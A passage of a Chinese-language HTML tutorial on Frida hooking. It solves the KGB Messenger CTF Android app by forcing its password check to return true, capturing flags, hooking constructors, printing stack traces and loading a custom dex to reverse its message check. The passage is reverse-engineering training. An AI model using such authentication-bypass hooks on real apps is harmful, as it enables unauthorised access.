&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><p>接下来进入到login功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onLogin</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        EditText editText = (EditText) findViewById(R.id.login_username);</span><br><span class="line">        EditText editText2 = (EditText) findViewById(R.id.login_password);</span><br><span class="line">        <span class="keyword">this</span>.n = editText.getText().toString();</span><br><span class="line">        <span class="keyword">this</span>.o = editText2.getText().toString();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.n != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.o != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.n.isEmpty() &amp;&amp; !<span class="keyword">this</span>.o.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.n.equals(getResources().getString(R.string.username))) &#123;</span><br><span class="line">                Toast.makeText(<span class="keyword">this</span>, <span class="string">"User not recognized."</span>, <span class="number">0</span>).show();</span><br><span class="line">                editText.setText(<span class="string">""</span>);</span><br><span class="line">                editText2.setText(<span class="string">""</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!j()) &#123;</span><br><span class="line">                Toast.makeText(<span class="keyword">this</span>, <span class="string">"Incorrect password."</span>, <span class="number">0</span>).show();</span><br><span class="line">                editText.setText(<span class="string">""</span>);</span><br><span class="line">                editText2.setText(<span class="string">""</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                i();</span><br><span class="line">                startActivity(<span class="keyword">new</span> Intent(<span class="keyword">this</span>, MessengerActivity<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">j</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String str = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">byte</span> b : <span class="keyword">this</span>.m.digest(<span class="keyword">this</span>.o.getBytes())) &#123;</span><br><span class="line">            str = str + String.format(<span class="string">"%x"</span>, <span class="keyword">new</span> Object[]&#123;Byte.valueOf(b)&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str.equals(getResources().getString(R.string.password));</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">i</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] cArr = &#123;<span class="string">'('</span>, <span class="string">'W'</span>, <span class="string">'D'</span>, <span class="string">')'</span>, <span class="string">'T'</span>, <span class="string">'P'</span>, <span class="string">':'</span>, <span class="string">'#'</span>, <span class="string">'?'</span>, <span class="string">'T'</span>&#125;;</span><br><span class="line">        cArr[<span class="number">0</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">0</span>] ^ <span class="keyword">this</span>.n.charAt(<span class="number">1</span>));</span><br><span class="line">        cArr[<span class="number">1</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">1</span>] ^ <span class="keyword">this</span>.o.charAt(<span class="number">0</span>));</span><br><span class="line">        cArr[<span class="number">2</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">2</span>] ^ <span class="keyword">this</span>.o.charAt(<span class="number">4</span>));</span><br><span class="line">        cArr[<span class="number">3</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">3</span>] ^ <span class="keyword">this</span>.n.charAt(<span class="number">4</span>));</span><br><span class="line">        cArr[<span class="number">4</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">4</span>] ^ <span class="keyword">this</span>.n.charAt(<span class="number">7</span>));</span><br><span class="line">        cArr[<span class="number">5</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">5</span>] ^ <span class="keyword">this</span>.n.charAt(<span class="number">0</span>));</span><br><span class="line">        cArr[<span class="number">6</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">6</span>] ^ <span class="keyword">this</span>.o.charAt(<span class="number">2</span>));</span><br><span class="line">        cArr[<span class="number">7</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">7</span>] ^ <span class="keyword">this</span>.o.charAt(<span class="number">3</span>));</span><br><span class="line">        cArr[<span class="number">8</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">8</span>] ^ <span class="keyword">this</span>.n.charAt(<span class="number">6</span>));</span><br><span class="line">        cArr[<span class="number">9</span>] = (<span class="keyword">char</span>) (cArr[<span class="number">9</span>] ^ <span class="keyword">this</span>.n.charAt(<span class="number">8</span>));</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, <span class="string">"FLAG&#123;"</span> + <span class="keyword">new</span> String(cArr) + <span class="string">"&#125;"</span>, <span class="number">1</span>).show();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-29-092522.png" alt=""><br>从资源文件里找到username,密码则是要算一个j()函数，要让它返回true，顺便打印一下i函数toast到界面的flag。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Java.use(<span class="string">"com.tlamb96.kgbmessenger.LoginActivity"</span>).j.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line">Java.use(<span class="string">"android.widget.Toast"</span>).makeText.overload(<span class="string">'android.content.Context'</span>, <span class="string">'java.lang.CharSequence'</span>, <span class="string">'int'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">x, y, z</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> flag = Java.use(<span class="string">"java.lang.String"</span>).$<span class="keyword">new</span>(y)</span><br><span class="line">    <span class="built_in">console</span>.log(flag)</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">[Google Pixel::com.tlamb96.spetsnazmessenger]-&gt; FLAG&#123;G&amp;qG13     R0&#125;</span><br></pre></td></tr></table></figure><h3 id="Frida-hook-hook构造函数-打印栈回溯"><a href="#Frida-hook-hook构造函数-打印栈回溯" class="headerlink" title="Frida hook :hook构造函数/打印栈回溯"></a>Frida hook :hook构造函数/打印栈回溯</h3><p>总结:<br>hook构造函数实现通过use取得类，然后<code>clazz.$init.implementation = callback</code> hook构造函数。</p><p>我们先学习一下怎么hook构造函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="keyword">new</span> com.tlamb96.kgbmessenger.b.a(R.string.katya, <span class="string">"Archer, you up?"</span>, <span class="string">"2:20 am"</span>, <span class="keyword">true</span>));</span><br><span class="line">...</span><br><span class="line"><span class="keyword">package</span> com.tlamb96.kgbmessenger.b;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">a</span><span class="params">(<span class="keyword">int</span> i, String str, String str2, <span class="keyword">boolean</span> z)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.f448a = i;</span><br><span class="line">        <span class="keyword">this</span>.b = str;</span><br><span class="line">        <span class="keyword">this</span>.c = str2;</span><br><span class="line">        <span class="keyword">this</span>.d = z;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用<code>$init</code>来hook构造函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Java.use(<span class="string">"com.tlamb96.kgbmessenger.b.a"</span>).$init.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">i, str1, str2, z</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.$init(i, str1, str2, z)</span><br><span class="line">            <span class="built_in">console</span>.log(i, str1, str2, z)</span><br><span class="line">            printStack(<span class="string">"com.tlamb96.kgbmessenger.b.a"</span>)</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="Frida-hook-打印栈回溯"><a href="#Frida-hook-打印栈回溯" class="headerlink" title="Frida hook : 打印栈回溯"></a>Frida hook : 打印栈回溯</h3><p>打印栈回溯</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printStack</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> Exception = Java.use(<span class="string">"java.lang.Exception"</span>);</span><br><span class="line">        <span class="keyword">var</span> ins = Exception.$<span class="keyword">new</span>(<span class="string">"Exception"</span>);</span><br><span class="line">        <span class="keyword">var</span> straces = ins.getStackTrace();</span><br><span class="line">        <span class="keyword">if</span> (straces != <span class="literal">undefined</span> &amp;&amp; straces != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> strace = straces.toString();</span><br><span class="line">            <span class="keyword">var</span> replaceStr = strace.replace(<span class="regexp">/,/g</span>, <span class="string">"\\n"</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"============================="</span> + name + <span class="string">" Stack strat======================="</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(replaceStr);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"============================="</span> + name + <span class="string">" Stack end=======================\r\n"</span>);</span><br><span class="line">            Exception.$dispose();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出就是这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[Google Pixel::com.tlamb96.spetsnazmessenger]-&gt; 2131558449 111 02:27 下午 false</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;com.tlamb96.kgbmessenger.b.a Stack strat&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">com.tlamb96.kgbmessenger.b.a.&lt;init&gt;(Native Method)</span><br><span class="line">com.tlamb96.kgbmessenger.MessengerActivity.onSendMessage(Unknown Source:40)</span><br><span class="line">java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">android.support.v7.app.m$a.onClick(Unknown Source:25)</span><br><span class="line">android.view.View.performClick(View.java:6294)</span><br><span class="line">android.view.View$PerformClick.run(View.java:24770)</span><br><span class="line">android.os.Handler.handleCallback(Handler.java:790)</span><br><span class="line">android.os.Handler.dispatchMessage(Handler.java:99)</span><br><span class="line">android.os.Looper.loop(Looper.java:164)</span><br><span class="line">android.app.ActivityThread.main(ActivityThread.java:6494)</span><br><span class="line">java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:438)</span><br><span class="line">com.android.internal.os.ZygoteInit.main(ZygoteInit.java:807)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;com.tlamb96.kgbmessenger.b.a Stack end&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h3 id="Frida-hook-手动加载dex并调用"><a href="#Frida-hook-手动加载dex并调用" class="headerlink" title="Frida hook : 手动加载dex并调用"></a>Frida hook : 手动加载dex并调用</h3><p>总结：<br>编译出dex之后，通过<code>Java.openClassFile(&quot;xxx.dex&quot;).load()</code>加载，这样我们就可以正常通过<code>Java.use</code>调用里面的方法了。</p><p>现在我们来继续解决这个问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSendMessage</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">    EditText editText = (EditText) findViewById(R.id.edittext_chatbox);</span><br><span class="line">    String obj = editText.getText().toString();</span><br><span class="line">    <span class="keyword">if</span> (!TextUtils.isEmpty(obj)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.o.add(<span class="keyword">new</span> com.tlamb96.kgbmessenger.b.a(R.string.user, obj, j(), <span class="keyword">false</span>));</span><br><span class="line">        <span class="keyword">this</span>.n.c();</span><br><span class="line">        <span class="keyword">if</span> (a(obj.toString()).equals(<span class="keyword">this</span>.p)) &#123;</span><br><span class="line">            Log.d(<span class="string">"MessengerActivity"</span>, <span class="string">"Successfully asked Boris for the password."</span>);</span><br><span class="line">            <span class="keyword">this</span>.q = obj.toString();</span><br><span class="line">            <span class="keyword">this</span>.o.add(<span class="keyword">new</span> com.tlamb96.kgbmessenger.b.a(R.string.boris, <span class="string">"Only if you ask nicely"</span>, j(), <span class="keyword">true</span>));</span><br><span class="line">            <span class="keyword">this</span>.n.c();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (b(obj.toString()).equals(<span class="keyword">this</span>.r)) &#123;</span><br><span class="line">            Log.d(<span class="string">"MessengerActivity"</span>, <span class="string">"Successfully asked Boris nicely for the password."</span>);</span><br><span class="line">            <span class="keyword">this</span>.s = obj.toString();</span><br><span class="line">            <span class="keyword">this</span>.o.add(<span class="keyword">new</span> com.tlamb96.kgbmessenger.b.a(R.string.boris, <span class="string">"Wow, no one has ever been so nice to me! Here you go friend: FLAG&#123;"</span> + i() + <span class="string">"&#125;"</span>, j(), <span class="keyword">true</span>));</span><br><span class="line">            <span class="keyword">this</span>.n.c();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.m.b(<span class="keyword">this</span>.m.getAdapter().a() - <span class="number">1</span>);</span><br><span class="line">        editText.setText(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新的一关是一个聊天框，分析一下代码可知，obj是我们输入的内容，输入完了之后，加到一个<code>this.o</code>的ArrayList里。<br>关键的if判断就是<code>if (a(obj.toString()).equals(this.p))</code>和<code>if (b(obj.toString()).equals(this.r))</code>，所有hook a和b函数，让它们的返回值等于下面的字符串即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String p = <span class="string">"V@]EAASB\u0012WZF\u0012e,a$7(&amp;am2(3.\u0003"</span>;</span><br><span class="line"><span class="keyword">private</span> String q;</span><br><span class="line"><span class="keyword">private</span> String r = <span class="string">"\u0000dslp&#125;oQ\u0000 dks$|M\u0000h +AYQg\u0000P*!M$gQ\u0000"</span>;</span><br><span class="line"><span class="keyword">private</span> String s;</span><br></pre></td></tr></table></figure><p>但实际上这题比我想象中的还要麻烦，这题的逻辑上是如果通过了a和b这两个函数的计算，等于对应的值之后，会把用来计算的obj的值赋值给q和s，然后根据这个q和s来计算出最终的flag。<br>所以如果不逆向算法，通过hook的方式通过了a和b的计算，obj的值还是错误的，也计算不出正确的flag。</p><p>这样就逆向一下算法好了，先自己写一个apk，用java去实现注册机。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-30-004653.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-30-004915.png" alt=""><br>可以直接把class文件转成dex，不复述，我比较懒，所以我直接解压apk找到<code>classes.dex</code>，并push到手机上。<br>然后用frida加载这个dex，并调用里面的方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dex = Java.openClassFile(<span class="string">"/data/local/tmp/classes.dex"</span>).load();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"decode_P:"</span>+Java.use(<span class="string">"myapplication.example.com.reversea.reverseA"</span>).decode_P());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"r_to_hex:"</span>+Java.use(<span class="string">"myapplication.example.com.reversea.reverseA"</span>).r_to_hex());</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">decode_P:Boris, give me the password</span><br><span class="line">r_to_hex:<span class="number">0064736</span>c707d6f510020646b73247c4d0068202b4159516700502a214d24675100</span><br></pre></td></tr></table></figure><h2 id="Frida打印与参数构造"><a href="#Frida打印与参数构造" class="headerlink" title="Frida打印与参数构造"></a>Frida打印与参数构造</h2><ul><li>数组/(字符串)对象数组/gson/Java.array</li><li>对象/多态、强转Java.cast/接口Java.register</li><li>泛型、List、Map、Set、迭代打印</li><li>non-ascii 、 child-gating、rpc 上传到PC上打印<h3 id="char-Object-Object"><a href="#char-Object-Object" class="headerlink" title="char[]/[Object Object]"></a>char[]/[Object Object]</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Log.d(<span class="string">"SimpleArray"</span>, <span class="string">"onCreate: SImpleArray"</span>);</span><br><span class="line"><span class="keyword">char</span> arr[][] = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">4</span>][]; <span class="comment">// 创建一个4行的二维数组</span></span><br><span class="line">arr[<span class="number">0</span>] = <span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="string">'春'</span>, <span class="string">'眠'</span>, <span class="string">'不'</span>, <span class="string">'觉'</span>, <span class="string">'晓'</span> &#125;; <span class="comment">// 为每一行赋值</span></span><br><span class="line">arr[<span class="number">1</span>] = <span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="string">'处'</span>, <span class="string">'处'</span>, <span class="string">'闻'</span>, <span class="string">'啼'</span>, <span class="string">'鸟'</span> &#125;;</span><br><span class="line">arr[<span class="number">2</span>] = <span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="string">'夜'</span>, <span class="string">'来'</span>, <span class="string">'风'</span>, <span class="string">'雨'</span>, <span class="string">'声'</span> &#125;;</span><br><span class="line">arr[<span class="number">3</span>] = <span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="string">'花'</span>, <span class="string">'落'</span>, <span class="string">'知'</span>, <span class="string">'多'</span>, <span class="string">'少'</span> &#125;;</span><br><span class="line">Log.d(<span class="string">"SimpleArray"</span>, <span class="string">"-----横版-----"</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123; <span class="comment">// 循环4行</span></span><br><span class="line">    Log.d(<span class="string">"SimpleArraysToString"</span>, Arrays.toString(arr[i]));</span><br><span class="line">    Log.d(<span class="string">"SimpleStringBytes"</span>, Arrays.toString (Arrays.toString (arr[i]).getBytes()));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++) &#123; <span class="comment">// 循环5列</span></span><br><span class="line">        Log.d(<span class="string">"SimpleArray"</span>, Character.toString(arr[i][j])); <span class="comment">// 输出数组中的元素</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        Log.d(<span class="string">"SimpleArray"</span>, <span class="string">","</span>);<span class="comment">// 如果是一、三句，输出逗号</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Log.d(<span class="string">"SimpleArray"</span>, <span class="string">"。"</span>);<span class="comment">// 如果是二、四句，输出句号</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Java.openClassFile(<span class="string">"/data/local/tmp/r0gson.dex"</span>).load();</span><br><span class="line"><span class="keyword">const</span> gson = Java.use(<span class="string">'com.r0ysue.gson.Gson'</span>);</span><br><span class="line"></span><br><span class="line">Java.use(<span class="string">"java.lang.Character"</span>).toString.overload(<span class="string">'char'</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">char</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">this</span>.toString(char);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"char,result"</span>,char,result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Java.use(<span class="string">"java.util.Arrays"</span>).toString.overload(<span class="string">'[C'</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">charArray</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">this</span>.toString(charArray);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"charArray,result:"</span>,charArray,result)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"charArray Object Object:"</span>,gson.$<span class="keyword">new</span>().toJson(charArray));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>这里的<code>[C</code>是JNI函数签名<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-30-033242.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-30-033633.png" alt=""></li></ul><h3 id="byte"><a href="#byte" class="headerlink" title="byte[]"></a>byte[]</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Java.openClassFile(<span class="string">"/data/local/tmp/r0gson.dex"</span>).load();</span><br><span class="line"><span class="keyword">const</span> gson = Java.use(<span class="string">'com.r0ysue.gson.Gson'</span>);</span><br><span class="line"></span><br><span class="line">Java.use(<span class="string">"java.util.Arrays"</span>).toString.overload(<span class="string">'[B'</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">byteArray</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">this</span>.toString(byteArray);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"byteArray,result):"</span>,byteArray,result)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"byteArray Object Object:"</span>,gson.$<span class="keyword">new</span>().toJson(byteArray));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-30-034053.png" alt=""></p><h3 id="java-array构造"><a href="#java-array构造" class="headerlink" title="java array构造"></a>java array构造</h3><p>如果不只是想打印出结果，而是要替换原本的参数，就要先自己构造出一个charArray,使用<code>Java.array</code>API</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creates a Java array with elements of the specified `type`, from a</span></span><br><span class="line"><span class="comment"> * JavaScript array `elements`. The resulting Java array behaves like</span></span><br><span class="line"><span class="comment"> * a JS array, but can be passed by reference to Java APIs in order to</span></span><br><span class="line"><span class="comment"> * allow them to modify its contents.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param </span>type Type name of elements.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param </span>elements Array of JavaScript values to use for constructing the</span></span><br><span class="line"><span class="comment"> *                 Java array.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">function array(type: string, elements: any[]): any[];</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Java.use(<span class="string">"java.util.Arrays"</span>).toString.overload(<span class="string">'[C'</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">charArray</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> newCharArray = Java.array(<span class="string">'char'</span>, [ <span class="string">'一'</span>,<span class="string">'去'</span>,<span class="string">'二'</span>,<span class="string">'三'</span>,<span class="string">'里'</span> ]);</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">this</span>.toString(newCharArray);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"newCharArray,result:"</span>,newCharArray,result)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"newCharArray Object Object:"</span>,gson.$<span class="keyword">new</span>().toJson(newCharArray));</span><br><span class="line">    <span class="keyword">var</span> newResult = Java.use(<span class="string">'java.lang.String'</span>).$<span 